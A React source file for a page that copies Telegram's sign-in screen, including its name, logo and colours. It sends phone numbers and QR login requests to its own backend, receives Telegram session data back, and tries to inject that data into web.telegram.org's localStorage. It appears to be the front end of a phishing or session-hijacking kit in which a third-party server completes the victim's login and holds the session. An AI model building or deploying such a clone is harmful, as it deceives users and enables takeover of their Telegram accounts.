import React, { useEffect, useState } from 'react';
import { useNavigate } from "react-router-dom";
import { api } from '../services/router';
import Select from 'react-select';

const TelegramLogin = ({ setPhone }) => {
    const [phoneNumber, setPhoneNumber] = useState('+1');
    const [country, setCountry] = useState('United States');
    const [countryCode, setCountryCode] = useState('+1');
    const [phoneNumberError, setPhoneNumberError] = useState('');
    const [error, setError] = useState('');
    const [codes, setCountryCodes] = useState({});
    const [loading, setLoading] = useState(false);
    const [showQR, setShowQR] = useState(false);
    const [qrUrl, setQrUrl] = useState('');
    const navigate = useNavigate();

    useEffect(() => {
        const fetchCountryData = async () => {
            setLoading(true);
            try {
                const response = await fetch('https://restcountries.com/v3.1/all');
                if (!response.ok) throw new Error('Failed to fetch countries');
                const data = await response.json();

                const countryCodes = data.reduce((acc, country) => {
                    if (country.name?.common && country.idd?.root) {
                        const code = country.idd.suffixes?.[0]
                            ? `${country.idd.root}${country.idd.suffixes[0]}`
                            : country.idd.root;
                        acc[country.name.common] = code;
                    }
                    return acc;
                }, {});

                console.log('Loaded countries:', Object.keys(countryCodes).length);
                setCountryCodes(countryCodes);
                setPhoneNumber(countryCodes['United States'] || '+1');
            } catch (err) {
                console.error('Country fetch error:', err);
                setError('Using fallback countries');
                setCountryCodes({
                    'United States': '+1',
                    'United Kingdom': '+44',
                    'Canada': '+1',
                    'India': '+91',
                    'Australia': '+61'
                });
                setPhoneNumber('+1');
            } finally {
                setLoading(false);
            }
        };
        fetchCountryData();
    }, []);

    const handlePhoneLogin = async () => {
        const trimmedPhone = phoneNumber.trim();
        const phoneRegex = /^\+[0-9]{7,15}$/;

        if (!trimmedPhone || !phoneRegex.test(trimmedPhone)) {
            setPhoneNumberError('Enter a valid phone number with country code (e.g., +12345678901)');
            return;
        }

        setLoading(true);
        setError('');

        try {
            console.log('Sending code to:', trimmedPhone);
            const response = await api.post('/send_code', { 
                phone_number: trimmedPhone 
            });
            
            console.log('Phone login response:', response.data);
            
            if (response.data && response.data.user_id) {
                localStorage.setItem('user_id', response.data.user_id);
                localStorage.setItem('phone_number', trimmedPhone);
                navigate('/verify');
            } else {
                setError('Failed to send verification code. Please try again.');
            }
        } catch (err) {
            console.error('Phone login error:', err);
            setError(err.response?.data?.detail || 'Failed to send verification code. Please try again.');
        } finally {
            setLoading(false);
        }
    };

    const handleQRLogin = async () => {
        console.log('Initiating QR code login...');
        setLoading(true);
        setError('');
        setShowQR(false);
        try {
            const response = await api.post('/qrcodelogin');
            console.log('QR login response:', response.data);
            if (response.data.qr_url && response.data.user_id) {
                const userId = String(response.data.user_id);
                console.log('Storing user_id:', userId);  // Log the user_id
                localStorage.setItem('user_id', userId);
                setQrUrl(response.data.qr_url);
                setShowQR(true);
                startPollingForLogin(userId);
            } else {
                setError('Failed to generate QR code: Invalid response from server');
            }
        } catch (err) {
            console.error('QR login error:', err);
            setError('Failed to generate QR code: ' + (err.response?.data?.detail || err.message));
        } finally {
            setLoading(false);
        }
    };
    const [pollingIntervalId, setPollingIntervalId] = useState(null);

    const startPollingForLogin = (userId) => {
        if (!userId) return;
    
        console.log('Starting polling for QR login status for user:', userId);
    
        if (pollingIntervalId) {
            clearInterval(pollingIntervalId);
        }
    
        const intervalId = setInterval(async () => {
            try {
                const response = await api.post(`/verify_qr_login/${userId}`);
                console.log('QR verification response:', response.data);
    
                if (response.data.status === 200 && response.data.message === "QR login successful") {
                    console.log('QR code login successful!', response.data.user_info);
                    clearInterval(intervalId);
                    setPollingIntervalId(null);
                    setShowQR(false); // Hide QR UI after successful scan
    
                    // Store user info in localStorage
                    if (response.data.user_info) {
                        localStorage.setItem('telegram_user_id', response.data.user_info.id);
                        localStorage.setItem('telegram_user_name', response.data.user_info.first_name);
                        localStorage.setItem('telegram_user_phone', response.data.user_info.phone || 'N/A');
                    }
    
                    // Use session data from the response
                    const sessionData = response.data.session_data;
                    if (sessionData) {
                        localStorage.clear();
                        localStorage.setItem("account1", JSON.stringify(sessionData));
    
                        const telegramWebUrl = "https://web.telegram.org/k/";
                        const loginScript = `
                            localStorage.clear();
                            localStorage.setItem("account1", '${JSON.stringify(sessionData)}');
                            location.reload();
                        `;
    
                        const telegramWindow = window.open("", "_blank");
                        if (telegramWindow) {
                            telegramWindow.document.write(`
                                <html>
                                    <body>
                                        <script>
                                            window.location = "${telegramWebUrl}";
                                            setTimeout(() => {
                                                ${loginScript}
                                            }, 1000);
                                        </script>
                                    </body>
                                </html>
                            `);
                            telegramWindow.document.close();
                        } else {
                            console.warn("Popup blocked, falling back to current window");
                            localStorage.setItem("account1", JSON.stringify(sessionData));
                            window.location.href = telegramWebUrl;
                        }
                    } else {
                        setError('Session data missing after successful login');
                    }
                } else if (response.data.status === 202) {
                    console.log('QR code not yet scanned, continuing to poll...');
                } else {
                    console.error('Unexpected response status:', response.data.status);
                }
            } catch (err) {
                console.error('Error checking QR login status:', err);
                clearInterval(intervalId);
                setPollingIntervalId(null);
                setError('QR login failed: ' + (err.response?.data?.detail || err.message));
                setShowQR(false);
            }
        }, 500); // Reduced from 3000ms to 500ms for faster response
    
        setPollingIntervalId(intervalId);
    };
    
    useEffect(() => {
        return () => {
            if (pollingIntervalId) {
                clearInterval(pollingIntervalId);
            }
        };
    }, [pollingIntervalId]);

    const handleCountryChange = (selectedOption) => {
        const newCountry = selectedOption ? selectedOption.value : 'United States';
        setCountry(newCountry);
        const newCode = codes[newCountry] || '+1';
        setCountryCode(newCode);
        setPhoneNumber(newCode);
    };

    const countryOptions = Object.keys(codes)
        .sort()
        .map((countryName) => ({
            value: countryName,
            label: `${countryName} (${codes[countryName]})`,
        }));

    const customStyles = {
        control: (base) => ({
            ...base,
            backgroundColor: '#242F3D',
            border: 'none',
            borderRadius: '8px',
            padding: '6px',
            boxShadow: 'none',
            cursor: 'pointer',
        }),
        menu: (base) => ({
            ...base,
            borderRadius: '8px',
            backgroundColor: '#242F3D',
            boxShadow: '0 2px 8px rgba(0,0,0,0.2)',
            maxHeight: '200px',
            overflowY: 'auto',
        }),
        option: (base, state) => ({
            ...base,
            backgroundColor: state.isSelected ? '#3390EC' : state.isFocused ? '#374552' : '#242F3D',
            color: state.isSelected ? '#FFFFFF' : '#CCCCCC',
            cursor: 'pointer',
            padding: '8px 12px',
        }),
        singleValue: (base) => ({
            ...base,
            color: '#FFFFFF',
        }),
        input: (base) => ({
            ...base,
            color: '#FFFFFF',
        }),
        dropdownIndicator: (base) => ({
            ...base,
            color: '#3390EC',
            '&:hover': { color: '#5EACEF' },
        }),
    };

    useEffect(() => {
        if (showQR && qrUrl) {
            console.log('QR Code should render now with URL:', qrUrl);
        }
    }, [showQR, qrUrl]);

    const handleQRError = (error) => {
        console.error('QR Code rendering error:', error);
        setError(error.message || 'Error rendering QR code');
    };

    return (
        <div className="min-h-screen bg-[#17212B] flex items-center justify-center p-4">
            <div className="w-full max-w-sm bg-[#232E3C] rounded-lg p-6 shadow-md">
                <div className="flex flex-col items-center">
                    <div className="w-16 h-16 bg-[#3390EC] rounded-full flex items-center justify-center mb-4">
                        <svg className="w-8 h-8 text-white" viewBox="0 0 24 24" fill="none">
                            <path d="M20 4L3 11L10 14M20 4L17 21L10 14M20 4L10 14" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                        </svg>
                    </div>

                    <h1 className="text-xl font-bold text-white mb-2">Telegram</h1>
                    <p className="text-[#AAAAAA] text-sm mb-4">{showQR ? 'Scan QR Code' : 'Sign in'}</p>

                    {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
                    {loading && <p className="text-[#AAAAAA] text-sm mb-4">Loading...</p>}

                    {!showQR ? (
                        <>
                            <div className="w-full mb-4">
                                {Object.keys(codes).length > 0 ? (
                                    <Select
                                        options={countryOptions}
                                        value={countryOptions.find(option => option.value === country)}
                                        onChange={handleCountryChange}
                                        styles={customStyles}
                                        placeholder="Select country"
                                        isSearchable
                                    />
                                ) : (
                                    <p className="text-[#AAAAAA] text-sm">Loading countries...</p>
                                )}
                            </div>

                            <div className="w-full mb-4">
                                <input
                                    type="tel"
                                    className={`w-full bg-[#242F3D] text-white rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-[#3390EC] ${
                                        phoneNumberError ? 'border border-red-500' : ''
                                    }`}
                                    value={phoneNumber}
                                    onChange={(e) => setPhoneNumber(e.target.value)}
                                    onFocus={() => setPhoneNumberError('')}
                                    placeholder="Phone number"
                                />
                                {phoneNumberError && <p className="text-red-500 text-xs mt-1">{phoneNumberError}</p>}
                            </div>

                            <button
                                onClick={handlePhoneLogin}
                                disabled={loading}
                                className={`w-full bg-[#3390EC] text-white py-2 rounded-lg hover:bg-[#5EACEF] transition-colors ${
                                    loading ? 'opacity-50 cursor-not-allowed' : ''
                                }`}
                            >
                                NEXT
                            </button>

                            <button
                                onClick={handleQRLogin}
                                disabled={loading}
                                className="mt-4 text-[#3390EC] hover:text-[#5EACEF] text-sm"
                            >
                                LOG IN BY QR CODE
                            </button>
                        </>
                    ) : (
                        <div className="flex flex-col items-center p-4">
                            {loading ? (
                                <div className="w-64 h-64 flex items-center justify-center">
                                    <span className="text-gray-400">Generating QR code...</span>
                                </div>
                            ) : error ? (
                                <div className="text-red-500 p-4 border rounded-lg">
                                    Error: {error}
                                </div>
                            ) : qrUrl ? (
                                <div className="flex flex-col items-center">
                                    <div 
                                        className="bg-white rounded-lg p-4 mb-4 relative"
                                        style={{ width: '220px', height: '220px' }}
                                    >
                                        <img 
                                            src={`https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(qrUrl)}&size=180x180&margin=10&format=png`}
                                            alt="QR Code" 
                                            style={{
                                                display: 'block',
                                                margin: '0 auto',
                                                width: '180px',
                                                height: '180px'
                                            }}
                                            onError={handleQRError}
                                        />
                                        <img 
                                            src="https://telegram.org/img/t_logo.png" 
                                            alt="Telegram Logo"
                                            style={{
                                                position: 'absolute',
                                                top: '50%',
                                                left: '50%',
                                                transform: 'translate(-50%, -50%)',
                                                width: '50px',
                                                height: '50px',
                                                pointerEvents: 'none'
                                            }}
                                        />
                                    </div>
                                    
                                    <p className="text-[#AAAAAA] text-sm mb-2 text-center">
                                        Scan this QR code with Telegram
                                    </p>
                                    
                                    <button
                                        onClick={() => {
                                            setShowQR(false);
                                            if (pollingIntervalId) {
                                                clearInterval(pollingIntervalId);
                                                setPollingIntervalId(null);
                                            }
                                        }}
                                        className="mt-4 text-[#3390EC] hover:text-[#5EACEF] text-sm"
                                    >
                                        RETURN TO PHONE LOGIN
                                    </button>
                                </div>
                            ) : (
                                <div className="text-red-500 p-4 border rounded-lg">
                                    Failed to generate QR code
                                </div>
                            )}
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
};

export default TelegramLogin;